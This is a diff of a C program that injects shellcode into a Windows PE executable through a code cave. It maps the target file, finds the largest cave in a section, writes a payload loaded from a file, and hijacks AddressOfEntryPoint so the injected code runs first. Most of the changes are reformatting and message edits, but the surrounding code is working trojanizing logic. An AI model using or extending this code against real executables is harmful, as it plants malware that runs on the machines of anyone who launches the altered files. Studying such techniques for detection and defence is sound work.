@@ -87,7 +87,6 @@ int enumerateSection(PIMAGE_SECTION_HEADER pSectionHeader, PBYTE pBuffer, CAVE_I
 	}
 
 	DWORD caveSectionOffset = (DWORD)(caveInfoArray[largestCaveIndex].pStartAddress - pSectionStart);
-	//DWORD oldrva = pSectionHeader->VirtualAddress + caveSectionOffset;
 	DWORD caveFileOffset = pSectionHeader->PointerToRawData + caveSectionOffset;
 	DWORD rva = pSectionHeader->VirtualAddress + (caveFileOffset - pSectionHeader->PointerToRawData);
 
@@ -156,7 +155,15 @@ void getPayloadBuffer(LPCSTR payloadFile, PBYTE *pPayloadBuffer, DWORD *pPayload
 {
 	printf("[+] Loading paylaod\n");
 
-	HANDLE hPayload = CreateFileA(payloadFile, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	HANDLE hPayload = CreateFileA(
+		payloadFile,
+		GENERIC_READ | GENERIC_WRITE,
+		0,
+		NULL,
+		OPEN_EXISTING,
+		FILE_ATTRIBUTE_NORMAL,
+		NULL
+	);
 	if (hPayload == INVALID_HANDLE_VALUE)
 	{
 		printf("[*] Error opening shellcode: %d\n", GetLastError());
@@ -221,14 +228,28 @@ int main(int argc, char *argv[])
 	printf("[+] Press any key to continue\n");
 	getchar();
 
-	HANDLE hFile = CreateFileA(argv[1], GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	HANDLE hFile = CreateFileA(
+		argv[1],
+		GENERIC_READ | GENERIC_WRITE,
+		0, NULL,
+		OPEN_EXISTING,
+		FILE_ATTRIBUTE_NORMAL,
+		NULL
+	);
 	if (hFile == INVALID_HANDLE_VALUE)
 	{
 		printf("[*] Error opening file: %d\n", GetLastError());
 		return 1;
 	}
 
-	HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
+	HANDLE hMap = CreateFileMappingA(
+		hFile,
+		NULL,
+		PAGE_READWRITE,
+		0,
+		0,
+		NULL
+	);
 	if (hMap == NULL)
 	{
 		printf("[*] Error creating file mapping: %d\n", GetLastError());
@@ -236,7 +257,13 @@ int main(int argc, char *argv[])
 		return 1;
 	}
 
-	LPVOID pBuffer = MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);
+	LPVOID pBuffer = MapViewOfFile(
+		hMap,
+		FILE_MAP_ALL_ACCESS,
+		0,
+		0,
+		0
+	);
 	if (pBuffer == NULL)
 	{
 		printf("[*] Error mapping view of file: %d\n", GetLastError());
@@ -250,9 +277,11 @@ int main(int argc, char *argv[])
 	DWORD originalEntryPoint = pNTHeaders->OptionalHeader.AddressOfEntryPoint;
 
 	printf("[+] Buffer: 0x%p\n", (void*)pBuffer);
-	printf("[+] EntryPoint RVA: 0x%04X\n", originalEntryPoint);
+	printf("[+] Entry point RVA: 0x%04X\n", originalEntryPoint);
 
 	PIMAGE_SECTION_HEADER sectionHeaders = IMAGE_FIRST_SECTION(pNTHeaders);
+
+
 	CAVE_INFO caveInfo = { 0 };
 
 	for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++)
@@ -284,7 +313,7 @@ int main(int argc, char *argv[])
 	printf("[+] Updating entrypoint to code cave RVA\n");
 	pNTHeaders->OptionalHeader.AddressOfEntryPoint = caveInfo.rva;
 
-	printf("[+] New EntryPoint RVA: 0x%04X\n", pNTHeaders->OptionalHeader.AddressOfEntryPoint);
+	printf("[+] New entry point RVA: 0x%04X\n", pNTHeaders->OptionalHeader.AddressOfEntryPoint);
 
 
 	printf("[+] Saving modifications\n");
